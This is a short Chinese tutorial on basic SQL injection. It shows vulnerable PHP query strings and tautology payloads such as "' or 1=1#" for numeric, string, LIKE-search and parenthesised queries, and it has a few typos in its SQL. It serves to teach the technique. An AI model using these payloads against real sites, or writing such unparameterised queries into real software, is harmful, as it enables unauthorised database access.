# SQL注入基础

## 一、原理

程序设计者在编码的过程中，过滤不够严格，导致可以通过构造恶意sql语句形成闭合，达到非法的目的。同时，如果给予存在sql漏洞的数据库过大权限，则可以进一步破坏

## 二、注入形式

### 1、数字型

首先对输入框是否存在漏洞，需要猜测其sql查询语句

基本sql查询语句为

```
select 字段1，字段2 from 表名 where id=1
```

构造形成闭合

```
select 字段1，字段2 from 表名 where id=1 or 1=1
payload:1 or 1=1
```

上面的payload 存在两个判断条件，因为是or,一个成立就行，数字型不用加单双引号

get型的直接修改url，post的需要改包。

### 2、字符型

字符型的第一步也是需要进行猜解

```
select 字段1，字段2 from 表名 where usernmae='lilei'
```

源码

```php
$query="select id,email from member where username='$name'";
```

字符型也就是字符串参数，一般会采用单引号或者双引号括起来

```
select 字段1，字段2 from 表名 where usernmae= 'lilei' or 1=1#'
payload:lilei' or 1=1#
```

上面的payload,usernmae=‘数据’，后面的#是注释掉'

### 3、搜索型

搜索型的漏洞，在于调用了一些搜索函数，进行模糊搜索

对应sql语句

```
selsect username,email from 表名 where user username like '%xxx%'
```

构成闭合

```
selsect username,email from 表名 where user username like '%xxx%' or 1=1#%'
payload:xxx%' or 1=1#
```

### 4、xx型

注入方式并不止上面的集中，其原理在于构造闭合

如以下源码

```php
$query="select id,email from member where username=('$name')";
```

构成闭合

```
$query="select id,email from member where username=('$xxx') or 1=1#)";
payload:xxx') or 1=1#
```

这玩意需要猜测和经验，也可以输入特殊字符如''进行报错提示，当然可能存在漏洞但报错机制被取消，这种就属于后文介绍的盲注了。
